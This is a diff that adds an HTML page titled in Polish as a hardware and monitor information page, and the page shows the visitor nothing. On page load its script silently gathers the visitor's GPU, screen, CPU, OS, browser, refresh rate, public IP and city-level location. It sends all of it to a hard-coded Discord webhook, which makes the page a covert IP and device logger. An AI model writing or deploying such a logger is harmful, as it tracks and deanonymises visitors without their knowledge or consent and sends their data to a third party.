@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Informacje o sprzęcie i monitorze</title>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+
+        function sendToDiscord(embed) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1223974482780094504/iKazDN84_7e5DUuroppd_VMleWf2JTr2Oq7qBHJ4Zwbg9S5oKv85sur5UAwBIz7CjjZg';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embed)
+            })
+            .then(response => {
+                if (!response.ok) {
+                }
+            })
+            .catch(error => {
+            });
+        }
+
+        const informacje ="**informacje o sprzęcie**"; 
+        let gpuInfo = '';
+        if (!window.WebGLRenderingContext) {
+            gpuInfo = "Przeglądarka nie obsługuje WebGL. Nie można uzyskać informacji o karcie graficznej.";
+        } else {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) {
+                gpuInfo = "Nie można uzyskać kontekstu WebGL. Nie można uzyskać informacji o karcie graficznej.";
+            } else {
+                const extension = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!extension) {
+                    gpuInfo = "Nie można uzyskać rozszerzenia WEBGL_debug_renderer_info. Nie można uzyskać informacji o karcie graficznej.";
+                } else {
+                    const gpuName = gl.getParameter(extension.UNMASKED_RENDERER_WEBGL);
+                    gpuInfo = `Nazwa karty graficznej: ${gpuName}`;
+                }
+            }
+        }
+
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const resolutionInfo = `Rozdzielczość ekranu: ${screenWidth}x${screenHeight}`;
+
+        const cpuInfo = navigator.hardwareConcurrency ? `Nazwa procesora: ${navigator.hardwareConcurrency}-rdzeniowy procesor` : "Nie można uzyskać informacji o procesorze.";
+
+        const operatingSystem = `System operacyjny: ${navigator.platform}`;
+
+        const browserInfo = `Przeglądarka: ${navigator.userAgent}`;
+
+        let startTime, frameCount = 0;
+        let refreshRateInfo = '';
+        function computeRefreshRate(timestamp) {
+            if (!startTime) startTime = timestamp;
+            const elapsedTime = timestamp - startTime;
+            if (elapsedTime >= 1000) {
+                const refreshRate = frameCount;
+                refreshRateInfo = `Częstotliwość odświeżania: ${refreshRate}Hz`;
+
+                $.get("https://api.ipify.org?format=json", function (data) {
+                    $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {
+                        const ipInfo = 'informacje o ip'+ '\n' +
+                                       'IP Address: ' +"`"+ data.ip +"`"+ '\n' +
+                                       'Country: ' +"`"+ ipData.country +"`"+ '\n' +
+                                       'Region: ' +"`"+ ipData.region +"`"+ '\n' +
+                                       'City: ' +"`"+ ipData.city +"`"+ '\n' +
+                                       'VPN: ' + (ipData.usingVPN === true ? '`Detected`' : '`Not Detected`')+ '\n';
+
+                        const embed = {
+                            username: "Info",
+                            avatar_url: "https://your-avatar-url.com",
+                            embeds: [
+                                {
+                                    title: "Informacje o sprzęcie, systemie operacyjnym i przeglądarce",
+                                    color: 15000,
+                                    description: `${informacje}\n${gpuInfo}\n${resolutionInfo}\n${cpuInfo}\n${operatingSystem}\n${browserInfo}\n${refreshRateInfo}\n\n${ipInfo}`
+                                }
+                            ]
+                        };
+
+                        sendToDiscord(embed);
+                    });
+                });
+
+            } else {
+                frameCount++;
+                requestAnimationFrame(computeRefreshRate);
+            }
+        }
+
+        const img = new Image();
+        img.onload = function() {
+            startTime = null;
+            frameCount = 0;
+            requestAnimationFrame(computeRefreshRate);
+        };
+        img.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
+
+    });
+</script>
+</body>
+</html>
